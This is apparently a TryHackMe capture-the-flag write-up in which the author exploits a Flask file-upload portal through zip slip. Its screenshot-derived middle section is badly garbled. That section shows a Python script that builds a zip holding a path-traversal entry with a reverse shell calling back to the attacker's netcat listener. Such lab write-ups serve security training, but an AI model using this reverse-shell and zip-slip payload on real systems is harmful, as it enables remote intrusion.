# The Hollow Shell - TryHackMe Writeup 

Hacker Holidays 2026, Day 10. Medium, Web, 90 points. 

Room blurb was "you find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. slip something inside and hold it to your ear." Should have clocked that as a hint straight away but it took me a bit to get there. 

## Recon 

Started with the usual nmap: 

<mark>nmap -sC -sV -p- 10.129.165.183</mark> 

Took like 2 minutes to run (full port range) but came back with: 

- 22/tcp - SSH 

- 5000/tcp - gunicorn, redirects to /login 

So port 5000 is a Flask app called Byte Lotus, a "Shoreline Display" room service portal. Nothing on 22 worth poking at yet so headed straight to the web app. 



<!-- Start of picture text -->
BYTE LOTUS<br>Staff sign-in<br>i |<br>—————————s<br><!-- End of picture text -->





<!-- Start of picture text -->
#33 Applications Places System P=) SunAug 9,17:17 @ HA : |, AttackBox IP: 10.129.65.41<br>CG] Byte Lotus—RoomService X | + = o x<br>Oo ¢ CG ®& Not Secure 10.129.165.183 uy os # =<br>BYTEWORUS<br>Staff sign-in<br>Those credentials weren't recognised. Try<br>again.<br>GeO Inspector Console (2 Debugger f) Network {} Style Editor (GQ) Performance 4 Memory >> oO: Gx<br>Ww ane Il + Q @ [disable cache NoThrottlings E<br>Neen webwah ConsoleConsole (Ctri+Shift+k)Shi |<br>Status Met... Domain File Initiator Type Transferred Size ons | : 210m<br>POST 4 10.129.165... login document html 2.19kB 1.93... alms<br><!-- End of picture text -->

} 3requests 658kB/2.19kBtransferred — Finish: 266ms [MJ DOMContentLoaded:50ms [J load:285 ms 



<!-- Start of picture text -->
Room Service / Shoreline Display e Signo<br>Bring a shell ashore<br>Shells on display<br><!-- End of picture text -->





<!-- Start of picture text -->
Shells on display<br>C8 © inspector Console (2 Debugger f, Network {} Style Editor (Q) Performance 4 Memory >> @: GJ «><br>0} 7 Filter URL 1} + Q > © > [[disable cache No Throttling Throttling + 4<br>All HTML CSS JS XHR Fonts Images Media WS Other<br>Status Meth... Domain File Initiator Type Transferred Size Oms||||| | +220msms<br>302 POST ff 10.129.165.... upload document html ... 2.03 kB OB |<br>GET =10.129.165....10.129.165.... dashboard document html 2.30kB 2.03kB | t1ms| t1ms||<br>|<br><!-- End of picture text -->

C8 © inspector Console (2 Debugger f, Network {} Style Editor (Q) Performance 4 Memory >> @: GJ «> 0} 7 Filter URL 1} + Q > © > [[disable cache No Throttling Throttling<sup>+</sup> 4 All HTML CSS JS XHR Fonts Images Media WS Other Status Meth... Domain File Initiator Type Transferred Size Oms||||| | +220msms 302 POST ff 10.129.165.... upload document html ... 2.03 kB OB | GET =10.129.165....10.129.165.... dashboard document html 2.30kB 2.03kB | t1ms| t1ms|| | 



<!-- Start of picture text -->
ee<br>CG) Byte Lotus—RoomSe:x Shoreline Display — By’ x 10.129.165.183:500'* | + ™ - o x<br>o C g) 10.129.165.183 w Si #F =<br>JSON Raw Data Headers.<br>Save Copy CollapseAll Expand All F ON<br>name : "test<br>assets: []<br><!-- End of picture text -->



<!-- Start of picture text -->
cy 0 Inspector @ Console (> Debugger NN Network {} Style Editor (2) Performance Pa Memory >> 01 ia “<br>WV FilterURLs 11 + Q @  [Jdisable Cache No Throttling+<br>All HTML CSS JS XHR Fonts Images Media WS Other<br>St M Do... File Init... Ty Tra... Si BJ) Headers Cookies Request Response Timings<br>36 GE fg... style.css sty... ss cac... 44 © Request Cookies<br><!-- End of picture text -->







root@ip-10-129-65-41:~# nc -lvnp 4444 Listening on 0.0.0.0 4444 * root@ip-10-129-65-41: ~/hollow-shell - o » File Eqit View Search Terminal Help root@ip-10-129-65-41:~# mkdir -p ~/hollow-shell && cd ~/hollow-shell cat > build_payload.py << 'EOF' import zipfile, json Manifest = {"name": "reverse", "assets": []} callback = > — import socket, os, pty sock = socket.socket(socket.AF_INET, socket.SOCK_ STREAM) sock.connect(("10.129.65.41", 4444)) flor fd in (6, 1, 2): os.dup2(sock.fileno(), fd) pty.spawn("/bin/bash") With zipfile.ZipFile("reverse-shell.zip", "w'") as 2: z.writestr("shell.json", json.dumps(manifest)) z.writestr("../../hooks/callback.py", callback) EOF python3 build payLload.py root@ip-10-129-65-41:~/hollow-shell# unzip -l reverse-sheLl.zip Archive: reverse-sheLll.zip Length Date Time Name 33 2026-08-09 17:35 shell.json 193 2026-08-09 17:35 ../../hooks/callback.py 226 2 files root@ip-10-129-65-41:~/hollow-shell# 



root@ip-10-129-65-41:~# nc -lvnp 4444 Listening on 0.0.0.0 4444 Connection received on 10.129.165.183 40978 roomservice@tryhackme - 2404: /var/www/conchs | 



<mark>fnd / -iname "*fag*" 2>/dev/null</mark> 

which turned up /home/roomservice/flag.txt. 

<mark>cat /home/roomservice/fag.txt</mark> 

### **THM{z1p_sl1pp3d_1nt0_a_sh3ll}** 

## Stuff I took away from this one 

- Read the flavour text properly. "automation hooks" + "theme worker applies these for you" was basically a straight up description of the vuln mechanism, I just didn't connect it fast enough and went hunting for a hooks field in the JSON that didn't exist. 

- Zip slip is still such a simple bug to introduce, just don't sanitise filenames on extraction and you've got arbitrary write. Worth checking for on literally any file upload + extract feature going forward. 

- Always double check where a file actually landed when a relative path is involved, wasted a few minutes because ../test.zip put the test file in my home dir instead of where I expected it. 

- Good habit confirmed again: check page source before doing anything else on a login page, found the default creds in like 30 seconds just from ctrl+u. 

## Tools I used 

- nmap 

- Firefox devtools (network tab, page source) 

- curl 

- python3 (zipfile module for building the payload) 

- netcat 

